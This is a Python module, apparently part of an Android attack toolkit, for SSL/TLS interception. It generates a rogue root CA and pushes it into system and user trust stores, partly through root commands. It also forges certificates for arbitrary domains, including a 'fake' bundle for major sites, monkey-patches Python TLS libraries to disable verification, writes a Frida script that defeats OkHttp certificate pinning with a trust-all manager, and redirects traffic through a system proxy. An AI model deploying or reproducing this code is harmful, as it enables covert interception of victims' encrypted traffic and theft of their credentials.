
"""
Certificate Manager Module for SSL/TLS Manipulation
Implements certificate management, pinning bypass, and SSL interception
"""

import os
import sys
import ssl
import socket
import time
import subprocess
import threading
import hashlib
import base64
import json
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any
import urllib3
import requests
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import pkcs12


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CertificateManager:
    """Advanced certificate management and SSL manipulation system"""
    
    def __init__(self, ca_name: str = "Custom_Root_CA", verbose: bool = False):
        self.ca_name = ca_name
        self.verbose = verbose
        self.ca_cert = None
        self.ca_private_key = None
        self.installed_certs = []
        self.intercepted_domains = {}
        self.pinning_bypassed = False
        

        self.android_cert_paths = [
            '/system/etc/security/cacerts/',
            '/data/misc/keychain/cacerts-added/',
            '/data/misc/user/0/cacerts-added/',
            '/apex/com.android.conscrypt/cacerts/'
        ]
        
    def generate_ca_certificate(self, validity_days: int = 3650) -> Tuple[bytes, bytes]:
        """Generate a custom Certificate Authority"""
        try:

            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            

            subject = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Custom Security"),
                x509.NameAttribute(NameOID.COMMON_NAME, self.ca_name),
            ])
            

            cert_builder = x509.CertificateBuilder()
            cert_builder = cert_builder.subject_name(subject)
            cert_builder = cert_builder.issuer_name(subject)
            cert_builder = cert_builder.public_key(private_key.public_key())
            cert_builder = cert_builder.serial_number(int(time.time()))
            cert_builder = cert_builder.not_valid_before(datetime.utcnow())
            cert_builder = cert_builder.not_valid_after(
                datetime.utcnow() + timedelta(days=validity_days)
            )
            

            cert_builder = cert_builder.add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True
            )
            cert_builder = cert_builder.add_extension(
                x509.KeyUsage(
                    key_cert_sign=True,
                    crl_sign=True,
                    digital_signature=False,
                    key_encipherment=False,
                    content_commitment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    encipher_only=False,
                    decipher_only=False
                ),
                critical=True
            )
            

            certificate = cert_builder.sign(private_key, hashes.SHA256())
            

            self.ca_cert = certificate
            self.ca_private_key = private_key
            

            cert_pem = certificate.public_bytes(serialization.Encoding.PEM)
            key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            self._log(f"Generated CA certificate: {self.ca_name}")
            return cert_pem, key_pem
            
        except Exception as e:
            self._log(f"Failed to generate CA certificate: {e}")
            return None, None
    
    def install_ca_certificate(self, cert_pem: bytes = None, force_install: bool = False) -> bool:
        """Install CA certificate to Android system store"""
        try:
            if cert_pem is None:
                if self.ca_cert is None:
                    self._log("No CA certificate available to install")
                    return False
                cert_pem = self.ca_cert.public_bytes(serialization.Encoding.PEM)
            

            cert_hash = hashlib.md5(cert_pem).hexdigest()[:8]
            cert_filename = f"{cert_hash}.0"
            
            success = False
            

            for cert_path in self.android_cert_paths:
                try:
                    if not os.path.exists(cert_path) and force_install:
                        os.makedirs(cert_path, exist_ok=True)
                    
                    if os.path.exists(cert_path) or force_install:
                        cert_file_path = os.path.join(cert_path, cert_filename)
                        

                        with open(cert_file_path, 'wb') as f:
                            f.write(cert_pem)
                        

                        os.chmod(cert_file_path, 0o644)
                        
                        self._log(f"Installed CA certificate to: {cert_file_path}")
                        self.installed_certs.append(cert_file_path)
                        success = True
                        

                        self._update_cert_store(cert_path)
                        
                except Exception as e:
                    self._log(f"Failed to install to {cert_path}: {e}")
            

            if not success:
                success = self._install_via_keystore(cert_pem, cert_filename)
            

            if not success:
                success = self._install_user_certificate(cert_pem)
            
            return success
            
        except Exception as e:
            self._log(f"CA certificate installation failed: {e}")
            return False
    
    def generate_domain_certificate(self, domain: str, san_domains: List[str] = None) -> Tuple[bytes, bytes]:
        """Generate certificate for specific domain signed by CA"""
        try:
            if self.ca_cert is None or self.ca_private_key is None:
                self._log("CA certificate not available for signing")
                return None, None
            

            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            

            subject = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Custom Domain Cert"),
                x509.NameAttribute(NameOID.COMMON_NAME, domain),
            ])
            

            cert_builder = x509.CertificateBuilder()
            cert_builder = cert_builder.subject_name(subject)
            cert_builder = cert_builder.issuer_name(self.ca_cert.subject)
            cert_builder = cert_builder.public_key(private_key.public_key())
            cert_builder = cert_builder.serial_number(int(time.time()) + hash(domain))
            cert_builder = cert_builder.not_valid_before(datetime.utcnow())
            cert_builder = cert_builder.not_valid_after(
                datetime.utcnow() + timedelta(days=365)
            )
            

            san_list = [x509.DNSName(domain)]
            if san_domains:
                san_list.extend([x509.DNSName(san_domain) for san_domain in san_domains])
            
            cert_builder = cert_builder.add_extension(
                x509.SubjectAlternativeName(san_list),
                critical=False
            )
            

            cert_builder = cert_builder.add_extension(
                x509.BasicConstraints(ca=False, path_length=None),
                critical=True
            )
            cert_builder = cert_builder.add_extension(
                x509.KeyUsage(
                    key_cert_sign=False,
                    crl_sign=False,
                    digital_signature=True,
                    key_encipherment=True,
                    content_commitment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    encipher_only=False,
                    decipher_only=False
                ),
                critical=True
            )
            

            certificate = cert_builder.sign(self.ca_private_key, hashes.SHA256())
            

            cert_pem = certificate.public_bytes(serialization.Encoding.PEM)
            key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            self._log(f"Generated certificate for domain: {domain}")
            return cert_pem, key_pem
            
        except Exception as e:
            self._log(f"Failed to generate domain certificate: {e}")
            return None, None
    
    def bypass_certificate_pinning(self, target_methods: List[str] = None) -> bool:
        """Bypass certificate pinning using various techniques"""
        try:
            if target_methods is None:
                target_methods = ['ssl_context', 'requests', 'urllib3', 'okhttp', 'network_security_config']
            
            success = False
            

            if 'ssl_context' in target_methods:
                success |= self._bypass_ssl_context()
            

            if 'requests' in target_methods:
                success |= self._bypass_requests_pinning()
            

            if 'urllib3' in target_methods:
                success |= self._bypass_urllib3_pinning()
            

            if 'okhttp' in target_methods:
                success |= self._bypass_okhttp_pinning()
            

            if 'network_security_config' in target_methods:
                success |= self._modify_network_security_config()
            
            if success:
                self.pinning_bypassed = True
                self._log("Certificate pinning bypass activated")
            
            return success
            
        except Exception as e:
            self._log(f"Certificate pinning bypass failed: {e}")
            return False
    
    def intercept_ssl_traffic(self, target_domains: List[str], proxy_port: int = 8080) -> bool:
        """Set up SSL traffic interception for specified domains"""
        try:

            domain_certs = {}
            for domain in target_domains:
                cert_pem, key_pem = self.generate_domain_certificate(domain)
                if cert_pem and key_pem:
                    domain_certs[domain] = {'cert': cert_pem, 'key': key_pem}
            
            if not domain_certs:
                self._log("No certificates generated for interception")
                return False
            

            proxy_thread = threading.Thread(
                target=self._run_ssl_proxy,
                args=(domain_certs, proxy_port),
                daemon=True
            )
            proxy_thread.start()
            

            self._configure_system_proxy('127.0.0.1', proxy_port)
            
            self.intercepted_domains = domain_certs
            self._log(f"SSL interception started for {len(target_domains)} domains on port {proxy_port}")
            
            return True
            
        except Exception as e:
            self._log(f"SSL interception setup failed: {e}")
            return False
    
    def extract_certificates_from_apk(self, apk_path: str) -> List[Dict]:
        """Extract certificates from APK for analysis"""
        try:
            certificates = []
            

            try:
                result = subprocess.run([
                    'aapt', 'dump', 'badging', apk_path
                ], capture_output=True, text=True, timeout=30)
                


                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'certificate' in line.lower():
                            certificates.append({'source': 'aapt', 'data': line.strip()})
            except:
                pass
            

            try:
                import zipfile
                with zipfile.ZipFile(apk_path, 'r') as apk_zip:

                    cert_files = [f for f in apk_zip.namelist()
                                 if f.startswith('META-INF/') and
                                 (f.endswith('.RSA') or f.endswith('.DSA') or f.endswith('.EC'))]
                    
                    for cert_file in cert_files:
                        cert_data = apk_zip.read(cert_file)
                        certificates.append({
                            'file': cert_file,
                            'size': len(cert_data),
                            'data': base64.b64encode(cert_data).decode()
                        })
            except Exception as e:
                self._log(f"ZIP extraction failed: {e}")
            
            self._log(f"Extracted {len(certificates)} certificates from APK")
            return certificates
            
        except Exception as e:
            self._log(f"Certificate extraction failed: {e}")
            return []
    
    def create_fake_certificate_bundle(self, target_domains: List[str]) -> str:
        """Create a bundle of fake certificates for target domains"""
        try:
            bundle_path = "/tmp/fake_cert_bundle.pem"
            
            with open(bundle_path, 'wb') as bundle_file:

                if self.ca_cert:
                    ca_pem = self.ca_cert.public_bytes(serialization.Encoding.PEM)
                    bundle_file.write(ca_pem)
                    bundle_file.write(b'\n')
                

                for domain in target_domains:
                    cert_pem, _ = self.generate_domain_certificate(domain)
                    if cert_pem:
                        bundle_file.write(cert_pem)
                        bundle_file.write(b'\n')
            
            self._log(f"Created fake certificate bundle: {bundle_path}")
            return bundle_path
            
        except Exception as e:
            self._log(f"Failed to create certificate bundle: {e}")
            return None
    
    def _bypass_ssl_context(self) -> bool:
        """Override SSL context to disable verification"""
        try:

            original_create_default_context = ssl.create_default_context
            original_wrap_socket = ssl.SSLContext.wrap_socket
            
            def patched_create_default_context(*args, **kwargs):
                context = original_create_default_context(*args, **kwargs)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                return context
            
            def patched_wrap_socket(self, *args, **kwargs):
                kwargs['server_hostname'] = None
                return original_wrap_socket(self, *args, **kwargs)
            

            ssl.create_default_context = patched_create_default_context
            ssl.SSLContext.wrap_socket = patched_wrap_socket
            
            return True
            
        except Exception as e:
            self._log(f"SSL context bypass failed: {e}")
            return False
    
    def _bypass_requests_pinning(self) -> bool:
        """Patch requests library to disable SSL verification"""
        try:
            import requests.adapters
            

            original_init_poolmanager = requests.adapters.HTTPAdapter.init_poolmanager
            
            def patched_init_poolmanager(*args, **kwargs):
                kwargs['ssl_context'] = ssl.create_default_context()
                kwargs['ssl_context'].check_hostname = False
                kwargs['ssl_context'].verify_mode = ssl.CERT_NONE
                return original_init_poolmanager(*args, **kwargs)
            
            requests.adapters.HTTPAdapter.init_poolmanager = patched_init_poolmanager
            

            requests.adapters.DEFAULT_POOLBLOCK = False
            
            return True
            
        except Exception as e:
            self._log(f"Requests pinning bypass failed: {e}")
            return False
    
    def _bypass_urllib3_pinning(self) -> bool:
        """Patch urllib3 to disable SSL verification"""
        try:
            import urllib3.util.ssl_
            

            original_create_urllib3_context = urllib3.util.ssl_.create_urllib3_context
            
            def patched_create_urllib3_context(*args, **kwargs):
                context = original_create_urllib3_context(*args, **kwargs)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                return context
            
            urllib3.util.ssl_.create_urllib3_context = patched_create_urllib3_context
            
            return True
            
        except Exception as e:
            self._log(f"urllib3 pinning bypass failed: {e}")
            return False
    
    def _bypass_okhttp_pinning(self) -> bool:
        """Generate Frida script for OkHttp pinning bypass"""
        try:
            frida_script = '''
            Java.perform(function() {
                // OkHttp 3.x
                var CertificatePinner = Java.use("okhttp3.CertificatePinner");
                CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
                    console.log("[+] Certificate pinning bypassed for: " + hostname);
                    return;
                };
                
                // OkHttp 4.x
                try {
                    var CertificatePinner4 = Java.use("okhttp3.internal.tls.CertificatePinner");
                    CertificatePinner4.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
                        console.log("[+] Certificate pinning bypassed for: " + hostname);
                        return;
                    };
                } catch (e) {
                    console.log("[-] OkHttp 4.x not found");
                }
                
                // Trust all certificates
                var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
                var SSLContext = Java.use("javax.net.ssl.SSLContext");
                
                var TrustManager = Java.registerClass({
                    name: "com.custom.TrustManager",
                    implements: [X509TrustManager],
                    methods: {
                        checkClientTrusted: function(chain, authType) {},
                        checkServerTrusted: function(chain, authType) {},
                        getAcceptedIssuers: function() { return []; }
                    }
                });
                
                var TrustManagers = [TrustManager.$new()];
                var SSLContextInstance = SSLContext.getInstance("TLS");
                SSLContextInstance.init(null, TrustManagers, null);
                
                console.log("[+] SSL/TLS certificate pinning bypass loaded");
            });
            '''
            

            script_path = "/tmp/okhttp_bypass.js"
            with open(script_path, 'w') as f:
                f.write(frida_script)
            
            self._log(f"Generated OkHttp bypass script: {script_path}")
            return True
            
        except Exception as e:
            self._log(f"OkHttp bypass script generation failed: {e}")
            return False
    
    def _modify_network_security_config(self) -> bool:
        """Create permissive network security configuration"""
        try:
            config_xml = '''<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </debug-overrides>
</network-security-config>'''
            

            config_path = "/tmp/network_security_config.xml"
            with open(config_path, 'w') as f:
                f.write(config_xml)
            

            android_config_paths = [
                "/data/data/*/res/xml/network_security_config.xml",
                "/system/etc/security/network_security_config.xml"
            ]
            
            success = False
            for config_target in android_config_paths:
                try:
                    if '*' not in config_target:
                        os.makedirs(os.path.dirname(config_target), exist_ok=True)
                        with open(config_target, 'w') as f:
                            f.write(config_xml)
                        self._log(f"Created network security config: {config_target}")
                        success = True
                except:
                    pass
            
            return success or True
            
        except Exception as e:
            self._log(f"Network security config modification failed: {e}")
            return False
    
    def _install_via_keystore(self, cert_pem: bytes, cert_filename: str) -> bool:
        """Install certificate using Android keystore commands"""
        try:

            temp_cert = f"/tmp/{cert_filename}"
            with open(temp_cert, 'wb') as f:
                f.write(cert_pem)
            

            commands = [
                ['su', '-c', f'cp {temp_cert} /system/etc/security/cacerts/'],
                ['pm', 'install-existing-certificate', temp_cert],
                ['settings', 'put', 'secure', 'ca_cert_install', temp_cert]
            ]
            
            for cmd in commands:
                try:
                    result = subprocess.run(cmd, capture_output=True, timeout=10)
                    if result.returncode == 0:
                        self._log(f"Certificate installed via: {' '.join(cmd)}")
                        return True
                except:
                    continue
            
            return False
            
        except Exception as e:
            self._log(f"Keystore installation failed: {e}")
            return False
    
    def _install_user_certificate(self, cert_pem: bytes) -> bool:
        """Install certificate to user certificate store"""
        try:

            user_cert_paths = [
                "/data/misc/user/0/cacerts-added/",
                "/data/misc/keychain/cacerts-added/",
                os.path.expanduser("~/.android/cacerts/")
            ]
            
            cert_hash = hashlib.md5(cert_pem).hexdigest()[:8]
            cert_filename = f"{cert_hash}.0"
            
            for cert_path in user_cert_paths:
                try:
                    os.makedirs(cert_path, exist_ok=True)
                    cert_file = os.path.join(cert_path, cert_filename)
                    
                    with open(cert_file, 'wb') as f:
                        f.write(cert_pem)
                    
                    os.chmod(cert_file, 0o644)
                    self._log(f"Installed user certificate: {cert_file}")
                    return True
                    
                except Exception as e:
                    continue
            
            return False
            
        except Exception as e:
            self._log(f"User certificate installation failed: {e}")
            return False
    
    def _update_cert_store(self, cert_path: str):
        """Update system certificate store"""
        try:

            subprocess.run(['c_rehash', cert_path], capture_output=True, timeout=10)
            

            subprocess.run(['update-ca-certificates'], capture_output=True, timeout=10)
            
        except Exception:
            pass
    
    def _configure_system_proxy(self, proxy_host: str, proxy_port: int):
        """Configure system-wide proxy settings"""
        try:

            proxy_settings = [
                ['settings', 'put', 'global', 'http_proxy', f'{proxy_host}:{proxy_port}'],
                ['settings', 'put', 'global', 'global_http_proxy_host', proxy_host],
                ['settings', 'put', 'global', 'global_http_proxy_port', str(proxy_port)]
            ]
            
            for setting in proxy_settings:
                try:
                    subprocess.run(setting, capture_output=True, timeout=5)
                except:
                    pass
            

            os.environ['HTTP_PROXY'] = f'http://{proxy_host}:{proxy_port}'
            os.environ['HTTPS_PROXY'] = f'http://{proxy_host}:{proxy_port}'
            
        except Exception as e:
            self._log(f"Proxy configuration failed: {e}")
    
    def _run_ssl_proxy(self, domain_certs: Dict, port: int):
        """Run SSL interception proxy"""
        try:
            import socket
            import threading
            
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('127.0.0.1', port))
            server_socket.listen(10)
            
            self._log(f"SSL proxy listening on port {port}")
            
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    proxy_thread = threading.Thread(
                        target=self._handle_proxy_connection,
                        args=(client_socket, domain_certs),
                        daemon=True
                    )
                    proxy_thread.start()
                except Exception as e:
                    self._log(f"Proxy connection error: {e}")
                    
        except Exception as e:
            self._log(f"SSL proxy failed: {e}")
    
    def _handle_proxy_connection(self, client_socket, domain_certs):
        """Handle individual proxy connection"""
        try:



            
            data = client_socket.recv(4096)
            if data:

                request = data.decode('utf-8', errors='ignore')
                

                if 'Host:' in request:
                    host_line = [line for line in request.split('\n') if 'Host:' in line][0]
                    domain = host_line.split('Host:')[1].strip().split(':')[0]
                    
                    if domain in domain_certs:
                        self._log(f"Intercepting SSL for: {domain}")

                
            client_socket.close()
            
        except Exception as e:
            self._log(f"Proxy connection handling failed: {e}")
    
    def _log(self, message: str):
        """Log certificate management activities"""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        
        if self.verbose:
            print(log_entry)


def quick_ca_install(ca_name: str = "Custom_Root_CA") -> bool:
    """Quick CA generation and installation"""
    cert_manager = CertificateManager(ca_name, verbose=True)
    cert_pem, key_pem = cert_manager.generate_ca_certificate()
    
    if cert_pem and key_pem:
        return cert_manager.install_ca_certificate(cert_pem, force_install=True)
    
    return False

def bypass_all_pinning() -> bool:
    """Bypass all common certificate pinning methods"""
    cert_manager = CertificateManager(verbose=True)
    return cert_manager.bypass_certificate_pinning()


if __name__ == "__main__":
    print("Certificate Manager Test Suite")
    

    cert_manager = CertificateManager("Test_Root_CA", verbose=True)
    
    print("\n=== Generating CA Certificate ===")
    cert_pem, key_pem = cert_manager.generate_ca_certificate()
    if cert_pem and key_pem:
        print("CA certificate generated successfully")
        

        with open("/tmp/test_ca.crt", "wb") as f:
            f.write(cert_pem)
        with open("/tmp/test_ca.key", "wb") as f:
            f.write(key_pem)
        print("CA certificates saved to /tmp/")
    
    print("\n=== Generating Domain Certificate ===")
    domain_cert, domain_key = cert_manager.generate_domain_certificate(
        "example.com", ["www.example.com", "api.example.com"]
    )
    if domain_cert and domain_key:
        print("Domain certificate generated successfully")
        

        with open("/tmp/example.com.crt", "wb") as f:
            f.write(domain_cert)
        with open("/tmp/example.com.key", "wb") as f:
            f.write(domain_key)
    
    print("\n=== Testing Certificate Pinning Bypass ===")
    bypass_success = cert_manager.bypass_certificate_pinning(['ssl_context', 'requests'])
    print(f"Pinning bypass: {'SUCCESS' if bypass_success else 'FAILED'}")
    
    print("\n=== Creating Certificate Bundle ===")
    bundle_path = cert_manager.create_fake_certificate_bundle(["google.com", "facebook.com", "twitter.com"])
    if bundle_path:
        print(f"Certificate bundle created: {bundle_path}")
    
    print("\nCertificate manager test completed.")
